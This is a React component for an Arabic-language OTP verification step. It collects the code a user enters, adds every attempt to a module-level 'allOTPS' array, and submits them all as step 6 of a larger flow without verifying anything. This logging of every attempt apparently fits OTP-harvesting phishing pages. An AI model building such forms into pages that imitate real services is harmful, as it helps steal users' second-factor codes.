"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
const otp:string[]|undefined=[]

export function OTPVerification({ onNext,handleStepSubmit }: { onNext: () => void,handleStepSubmit:any }) {

  return (
    <form 
    onSubmit={(e)=>{
      e.preventDefault()
      const formData = new FormData(e.currentTarget)
      otp!.push(formData.get('otp')! as string)
       handleStepSubmit(
        {
          OTP: {
            otp:formData.get('otp'),
            allOTPS:otp
          },
        },
        6,
      )
      onNext()
    }}

    className="bg-white text-[#003B2D] rounded-lg p-6 max-w-md mx-auto">
      <div className="text-center space-y-4 mb-8">
        <h2 className="text-xl font-bold">أدخل رمز التحقق</h2>
        <p className="text-gray-600">تم إرسال رمز التحقق إلى رقم الجوال المسجل</p>
      </div>

      <div className="space-y-6">
        <div className="flex justify-center gap-4 dir-ltr">
            <Input
              type="text"
              maxLength={6}
              className="w-full h-10 text-center text-2xl"
              name="otp"
            />
        </div>

        <div className="text-center">
          <Button variant="link" className="text-blue-600">
            إعادة إرسال الرمز
          </Button>
        </div>

        <Button type="submit" className="w-full bg-green-600 hover:bg-green-700 text-white">تأكيد</Button>
      </div>
    </form>
  )
}

